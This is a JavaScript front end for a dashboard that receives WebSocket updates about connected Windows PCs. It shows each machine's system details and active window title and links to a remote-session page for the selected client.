'use strict';
let currentClient = '';
const clientDataMap = new Map();
const clientActivityMap = new Map();
const textDecoder = new TextDecoder('utf-8');

// UI & Clock Helpers
const getEl = (id) => document.getElementById(id);
setInterval(() => {
    const clock = getEl('clock');
    if (clock) clock.textContent = new Date().toLocaleTimeString('en-US', { hour12: false });
}, 1000);

document.addEventListener('click', (e) => {
    const sidebar = getEl('detailsSidebar');
    if (sidebar?.classList.contains('visible') && !sidebar.contains(e.target) && !e.target.closest('.device-entry')) {
        deselectDevice();
    }
});

// Unified Data Binding Function
function updateInfo(data = {}) {
    const getVal = (...keys) => {
        for (const k of keys) if (data[k] !== undefined && data[k] !== null) return data[k];
        return '—';
    };

    const name = getVal('clientName', 'ClientName');
    const fields = {
        Username: name !== '—' ? name.toUpperCase() : '—',
        MachineName: getVal('machineName', 'MachineName'),
        Workgroup: getVal('workGroup', 'WorkGroup'),
        Windows: getVal('windows', 'Windows'),
        WindowsVersion: getVal('windowsVersion', 'WindowsVersion'),
        OSVersion: getVal('osVersion', 'OSVersion'),
        OSArchitecture: getVal('osArchitecture', 'OSArchitecture'),
        SerialNumber: getVal('serialNumber', 'SerialNumber'),
        ProcessorCount: getVal('processorCount', 'ProcessorCount'),
        ScreenCount: getVal('screenCount', 'ScreenCount'),
        ActiveWindow: getVal('windowTitle', 'WindowTitle')
    };

    Object.entries(fields).forEach(([id, val]) => {
        const el = getEl(id);
        if (el) el.textContent = val;
    });
}

// WebSocket Connection
function connectWebSocket() {
    const ws = new WebSocket(`ws://${window.location.hostname}:2050/ws/browser`);
    ws.binaryType = 'arraybuffer';

    ws.onmessage = (e) => {
        if (!(e.data instanceof ArrayBuffer) || !e.data.byteLength) return;
        const bytes = new Uint8Array(e.data);
        const type = bytes[0];

        try {
            const data = JSON.parse(textDecoder.decode(bytes.subarray(1)));
            if (type === 0x11) handleClientListUpdate(data);
            if (type === 0x12) handleActivityUpdate(data);
        } catch (err) {
            console.error('WS Parse Error:', err);
        }
    };

    ws.onclose = () => setTimeout(connectWebSocket, 3000);
}

function handleClientListUpdate(clients) {
    clientDataMap.clear();
    clients.forEach(c => c.ClientName && clientDataMap.set(c.ClientName.toUpperCase(), c));
    renderDevices(clients);

    if (currentClient && clientDataMap.has(currentClient)) {
        selectDevice(currentClient);
    }
}

function handleActivityUpdate(activity) {
    const name = activity?.clientName || activity?.ClientName;
    if (!name) return;
    const accountKey = name.toUpperCase();

    clientActivityMap.set(accountKey, activity);

    // Update active task label on device list item
    const subEl = getEl(`sub-${accountKey}`);
    if (subEl) subEl.textContent = activity.windowTitle || activity.appName || 'Online';

    // Update sidebar instantly if this client is currently selected
    if (currentClient === accountKey) {
        selectDevice(currentClient);
    }
}

function renderDevices(clients) {
    const list = getEl('deviceList');
    if (!list) return;
    list.innerHTML = '';

    if (!clients.length) {
        list.innerHTML = '<div class="no-devices" id="noDevices">Waiting for connected PCs…</div>';
        return;
    }

    clients.forEach((item) => {
        const name = item.ClientName;
        if (!name) return;
        const key = name.toUpperCase();
        const act = clientActivityMap.get(key);
        const status = act ? (act.windowTitle || act.appName) : 'Idle / Online';

        const el = document.createElement('div');
        el.className = `device-entry ${currentClient === key ? 'active' : ''}`;
        el.dataset.name = name;
        el.innerHTML = `
            <div class="device-top">
                <div class="device-avatar-wrap"><div class="avatar">${escapeHtml(name).toUpperCase()}</div></div>
                <div class="status-badge"><span class="activity-dot"></span>Active</div>
            </div>
            <div class="device-body">
                <div class="device-body-label">Active Task</div>
                <div class="device-sub" id="sub-${key}">${escapeHtml(status)}</div>
            </div>`;

        el.addEventListener('click', (e) => {
            e.stopPropagation();
            selectDevice(name);
        });
        list.appendChild(el);
    });
}

function selectDevice(name) {
    currentClient = name ? name.toUpperCase() : '';

    document.querySelectorAll('.device-entry').forEach(el => {
        el.classList.toggle('active', el.dataset.name.toUpperCase() === currentClient);
    });

    getEl('detailsSidebar')?.classList.add('visible');

    const launchBtn = getEl('remoteLaunchBtn');
    if (launchBtn) launchBtn.href = `Remote.html?client=${encodeURIComponent(currentClient)}`;

    // Merge static list data with active JSON data
    const combinedData = Object.assign(
        {},
        clientDataMap.get(currentClient),
        clientActivityMap.get(currentClient)
    );

    updateInfo(combinedData);
}

function deselectDevice() {
    currentClient = '';
    getEl('detailsSidebar')?.classList.remove('visible');
    document.querySelectorAll('.device-entry').forEach(el => el.classList.remove('active'));
}

function escapeHtml(str) {
    return str ? String(str).replace(/[&<>]/g, s => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[s])) : '';
}

document.addEventListener('DOMContentLoaded', () => {
    connectWebSocket();
});